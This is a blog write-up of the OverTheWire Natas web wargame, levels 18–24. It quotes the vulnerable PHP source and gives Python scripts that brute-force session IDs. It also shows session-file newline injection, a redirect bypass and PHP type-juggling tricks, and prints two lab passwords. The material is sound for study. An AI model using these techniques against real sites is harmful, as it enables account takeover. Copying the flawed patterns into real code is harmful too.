---
layout: "post"
title: "OverTheWire Natas Write-Up (Part 3)"
date: "2020-10-28 09:25:31"
date_gmt: "2020-10-28 09:25:31"
modified: "2020-10-28 09:25:31"
modified_gmt: "2020-10-28 09:25:31"
slug: "overthewire-natas-write-up-part-3"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2020/10/28/overthewire-natas-write-up-part-3/"
guid: "http://y4y.space/?p=277"
wordpress_id: 277
parent_id: 0
categories: ["Uncategorized"]
---

{% raw %}
## Introduction

Natas is a web challenge series from OverTheWire.

https://overthewire.org/wargames/natas/

User needs to get password to advance to next level. The password file is located in `/etc/natas_webpass` directory, only the correspond user can read the current and next level's password.

This write up will show the necessary steps to get password.

## Natas 18

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-27-00-03-04.png?w=627)

Source:

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "<censored>" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
<?

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

It looks messy, but what it really does is just checking session IDs. In the comment we saw that the max session is just 640. So it means we can brute-force admin's session ID.

```
import requests
import sys

url = 'http://natas18.natas.labs.overthewire.org/index.php'
username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

for i in range(641):
    cookies = {
        'PHPSESSID': str(i)
    }
    req = requests.get(url, cookies=cookies, auth=(username, password))
    resp = req.content.decode()
    sys.stdout.write(f'\rTrying ID: {i}')
    if 'regular user' not in resp:
        print(resp)
        break
```

The code should be self-explanatory.

## Natas 19

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-27-00-28-30.png?w=643)

This time source code is not given, then let's just see what the new session looks like.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-27-00-31-50.png?w=301)

The hex string above looks like it can be converted to ASCII.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-27-00-32-24.png?w=1024)

So now I see, the first number is the session ID, and the second string is the username I put in. Let's do the same brute-force but change a little bit code.

```
import requests
import sys
import binascii

url = 'http://natas19.natas.labs.overthewire.org/index.php'
username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

for i in range(641):
    cookies = {
        'PHPSESSID': binascii.hexlify(f'{i}-admin'.encode()).decode()
    }
    req = requests.get(url, cookies=cookies, auth=(username, password))
    resp = req.content.decode()
    sys.stdout.write(f'\rTrying ID: {i}')
    if 'regular user' not in resp:
        print(resp)
        break
```

After a while, it should return the HTTP response with the correspond password.

## Natas 20

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-27-22-50-14.png?w=665)

Source:

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "<censored>" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
<?

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>

<form action="index.php" method="POST">
Your name: <input name="name" value="<?=$name?>"><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

A bunch of functions. Let's start from top, and get a rough idea on what those function do first.

First one, `debug` just outputs debug info to the page. `print_credentials` is pretty self-explanatory. Both `myopen` and `myclose` does nothing. Here comes the important ones, `myread` reads the content from the PHP session file, and set parameters accordingly. `mywrite` writes content to the PHP session file. And again, `mydestory` and `mygarbage` do nothing.

Then the code is calling `session_set_save_handler` to tell PHP how to interprete session files. It's overwriting PHP's default settings with the function above. The rest of code is pretty standard, doing its normal things.

The problem appears in the `myread` function, notice when the session file exists, it simply read lines from the file. The next steps is probably better understandable by some examples:

```
name admin
aaa bbb
```

Imagine the above content is in the session file, the session object will then be:

```
session['name']='admin';
sesion['aaa']='bbb';
```

And remember from the `print_credentials` function, it checks if `session['admin']=1;`. So we can simply inject the content of `admin 1` into the session file and fool it to think we are admin.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-27-23-01-42.png?w=1024)

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-27-23-34-34.png?w=1024)

And notice the cookie is different. Change the cookie to the one we can control and resend the request.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-27-23-35-34.png?w=1024)

## Natas 22

This level is so tricky.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-28-00-32-03.png?w=662)

Source:

```
 <?
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

<?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

So we see that to get the password, we need to provide a `revelio` GET parameter. Then the start of the source code also shows that it also checks if we are admin, and if not it will redirect us to the index page. However, after this code, it will also reveal the password.

The solution is just not to follow the redirection, use burp or curl to do that.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-28-00-37-47.png?w=1024)

As you can see the 'Follow redirection' button means there is redirect. And if you choose to follow the redirect, it will redirect to the index page.

## Natas 23

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-28-01-09-25.png?w=652)

Source:

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "<censored>" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

First it checks the output of `strstr` and the value of `$_REQUEST['passwd'] > 10`. This level is really easy, just try things around and eventually you will get an answer.

Use the PHP interactive mode `php -a`. Since the function `strstr` is deprecated in PHP 7.30, so I was using PHP 5.6, the command should then look like `php5.6 -a`.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-28-01-11-31.png?w=780)

Submit this and get your password.

## Natas 24

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-28-01-59-07.png?w=676)

Source:

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas24", "pass": "<censored>" };</script></head>
<body>
<h1>natas24</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

This `strcmp` function compares two strings, and returns an integer value.

However, though, when it's comparing a string with an array, it will return NULL. We can pass an array in PHP by adding a square bracket like this:`passwd[]=1`. And that's it, that's the solution…
{% endraw %}
